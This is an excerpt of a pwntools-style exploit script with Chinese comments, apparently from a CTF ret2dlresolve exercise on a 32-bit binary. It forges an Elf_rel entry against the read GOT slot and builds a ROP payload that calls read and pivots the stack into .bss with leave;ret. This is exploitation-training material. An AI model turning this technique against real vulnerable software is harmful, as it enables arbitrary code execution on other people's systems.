...
reloc_index=base_addr+24-rel_plt # 让程序在base+24的地方找Elf_rel
...
r_offset=e.got['read']           # fake_Elf_rel

r_sym=(fake_sym_addr-dynsym)/0x10
r_type=0x7
r_info=(int(r_sym)<<8)+(r_type) #最高位是dynsym的下标,前面/了16不加int可能是浮点数
...
#每啥好说的，就是一般的rop，构造read(0,bss_stage,100)同时完成栈迁移bss_stage
payload1=b'a'*offset         
payload1+=p32(read_plt_addr)  #ret_addr
payload1+=p32(four_pop_ret)   #read的ret_addr因为是直接到plt表，所以省去了call的返回地址入栈
payload1+=p32(0)              #to_ebx
payload1+=p32(base_addr)      #esi
payload1+=p32(100)            #edi
payload1+=p32(base_addr-4)    #ebp，ecx为0x0804a800
payload1+=p32(leave_ret_addr) #esp迁移到新栈
